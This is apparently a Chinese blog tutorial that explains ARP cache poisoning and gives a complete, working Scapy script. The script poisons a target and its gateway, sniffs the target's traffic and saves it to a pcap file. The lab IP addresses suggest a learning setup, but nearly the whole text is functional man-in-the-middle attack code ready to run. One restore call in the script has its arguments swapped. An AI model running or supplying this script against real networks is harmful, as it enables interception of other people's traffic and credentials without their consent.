### 利用Scapy进行ARP缓存投毒

原理：构造ARP数据包，

攻击者向攻击目标发送自己的mac地址，并告诉对方这是网关的mac，

同时向网关发送自己的mac地址，并让其认为这是攻击目标的mac地址

这样一来，攻击者以中间人的身份监听攻击目标与网关之间的数据

上代码：

根据IP获取mac地址的函数

```python
def get_mac(ip_address):
    responses,unanswered =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
    	return r[Ether].src
```



攻击完成后，用于还原网络配置的函数

```python
def restore_target(target_ip,target_mac,gateway_ip,gateway_mac):
    print("[*] Restoring target...")
    # 将真正网关的mac地址告诉目标让其修改缓存表
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    # 将真正的目标mac地址告诉网关，让其修改缓存表
    send(ARP(op=2,pdst=gateway_ip,psrc=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(),signal.SIGINT)
```



投毒函数：

```python
def poison_target(target_ip,target_mac,gateway_ip,gateway_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst  = gateway_mac
    
    print("[*] Beginning the ARP poison.")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(target_ip,target_mac,gateway_ip,gateway_mac)
    
    print("[*] Arp poison attack finished!!!")
    return
```



整体代码：

```python
'''
Autor: hummer
Date: 2022-05-01 08:45:34
LastEditors: hummer
'''

from pydoc import resolve
from socket import timeout
from scapy.all import *
import sys
import threading
import signal

interface = "VMware Network Adapter VMnet8"
target_ip = '10.10.10.134'
gateway_ip = '10.10.10.254'
packet_count = 1000


# 根据IP获取mac函数
def get_mac(ip_address):
    responses,unanswered =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src


# 投毒函数
def poison_target(target_ip,target_mac,gateway_ip,gateway_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst  = gateway_mac
    
    print("[*] Beginning the ARP poison.")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(target_ip,target_mac,gateway_ip,gateway_mac)
    
    print("[*] Arp poison attack finished!!!")
    return


# 还原网络配置函数
def restore_target(target_ip,target_mac,gateway_ip,gateway_mac):
    print("[*] Restoring target...")
    # 将真正网关的mac地址告诉目标让其修改缓存表
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    # 将真正的目标mac地址告诉网关，让其修改缓存表
    send(ARP(op=2,pdst=gateway_ip,psrc=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(),signal.SIGINT)



# 设置嗅探的网卡
conf.iface = interface

# 关闭输出
conf.verb = 0

print("[*] Setting up %s" % interface)

gateway_mac = get_mac(gateway_ip)
if gateway_mac is None:
    print("[!!!] Faild to get gateway MAC. Exiting.")
    sys.exit(0)
    
target_mac = get_mac(target_ip)
if target_mac is None:
    print("[!!!] Faild to get target MAC. Exiting.")
    sys.exit(0)

# 启动投毒线程
poison_thread = threading.Thread(target=poison_target,args=(target_ip,target_mac,gateway_ip,gateway_mac))
poison_thread.start()

try:
    print("[*] Starting sniffer for %d packets" % packet_count)

    bpf_filter = "ip host %s" % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

    # 将捕获到的数据包输出到文件
    wrpcap('arper.pacp',packets)

    # 还原网络配置
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

except KeyboardInterrupt:
    # 还原网络配置函数
    restore_target(target_ip,target_mac,gateway_ip,gateway_mac)
    sys.exit(0)

```

